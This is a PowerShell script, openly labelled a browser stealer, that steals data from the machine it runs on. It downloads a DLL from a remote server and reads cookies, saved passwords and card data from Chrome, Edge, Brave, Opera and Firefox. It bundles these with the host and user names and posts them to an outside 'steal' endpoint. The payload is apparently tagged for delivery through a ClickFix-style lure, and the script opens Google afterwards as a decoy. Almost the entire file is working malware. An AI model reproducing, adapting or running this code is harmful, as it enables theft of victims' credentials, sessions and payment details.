# ============================================================
# BROWSER STEALER — CLEAN WORKING VERSION (PC Name Fixed)
# ============================================================

$ErrorActionPreference = "Continue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
$LOGFILE = "$env:TEMP\stealer_log.txt"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "  BROWSER STEALER v3.0"
Write-Log "  Target: $env:COMPUTERNAME"
Write-Log "  Log: $LOGFILE"
Write-Log "============================================"
Write-Log ""

# ============================================================
# DOWNLOAD SQLITE DLL FROM YOUR SERVER
# ============================================================

$dllPath = "$env:TEMP\System.Data.SQLite.dll"

# Clean up any old DLL
if (Test-Path $dllPath) {
    Write-Log "[+] Removing old DLL"
    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
}

$dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
Write-Log "[+] Downloading SQLite DLL from: $dllUrl"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($dllUrl, $dllPath)
} catch {
    Write-Log "[!] Download failed: $_"
    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
    Read-Host "Press Enter to exit"
    exit
}

# Check if file exists and is large enough
if (-not (Test-Path $dllPath) -or (Get-Item $dllPath).Length -lt 50000) {
    Write-Log "[!] DLL not found or too small"
    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (rename sqlite3.dll)"
    Read-Host "Press Enter to exit"
    exit
}

Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"

# Load the DLL
try {
    [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
    Write-Log "[+] SQLite loaded successfully!"
} catch {
    Write-Log "[!] Failed to load DLL: $_"
    Read-Host "Press Enter to exit"
    exit
}

# ============================================================
# SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $row = @{}
            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                $n = $rdr.GetName($i)
                $v = $rdr.GetValue($i)
                if ($v -ne $null) { $row[$n] = $v }
            }
            $result += $row
        }
        $rdr.Close()
        $conn.Close()
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {}
    return $result
}

# ============================================================
# STEALER FUNCTIONS
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
    } catch {}
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $cookies
}

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            if ($r['username_value'] -and $r['password_value']) {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
            }
        }
    } catch {}
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{
                    name = $r['name_on_card']
                    number = $r['card_number_encrypted']
                    month = $r['expiration_month']
                    year = $r['expiration_year']
                    browser = $Name
                }
            }
        }
    } catch {}
    return $cards
}

# ============================================================
# STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

Write-Log ""
Write-Log "[+] Chrome cookies..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "[+] Edge cookies..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "[+] Brave cookies..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "[+] Opera cookies..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "[+] Firefox cookies..."
$allCookies += Get-FirefoxCookies

Write-Log "[+] Chrome passwords..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "[+] Edge passwords..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "[+] Brave passwords..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "[+] Opera passwords..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Log "[+] Firefox passwords..."
$allPasswords += Get-FirefoxPasswords

Write-Log "[+] Chrome cards..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "[+] Edge cards..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "[+] Brave cards..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# SUMMARY
# ============================================================

Write-Log ""
Write-Log "============================================"
Write-Log "  SUMMARY"
Write-Log "============================================"
Write-Log "Cookies:    $($allCookies.Count)"
Write-Log "Passwords:  $($allPasswords.Count)"
Write-Log "Cards:      $($allCards.Count)"
Write-Log "============================================"
Write-Log ""

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Log "[!] No data stolen!"
    Write-Log "[*] Possible reasons:"
    Write-Log "  - No saved passwords/cookies in browsers"
    Write-Log "  - Browser is running (locks the database)"
    Write-Log "  - Close the browser and try again"
    Write-Log ""
}

# ============================================================
# BUILD PAYLOAD — INCLUDES PC NAME IN FINGERPRINT
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ============================================================
# SEND TO SERVER
# ============================================================

Write-Log "[+] Sending data to server..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "[+] Data sent successfully!"
} catch {
    Write-Log "[!] Failed to send: $_"
}

# ============================================================
# CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "[+] Done!"
Write-Log "[+] Log saved to: $LOGFILE"
Write-Log ""
Read-Host "Press Enter to exit"
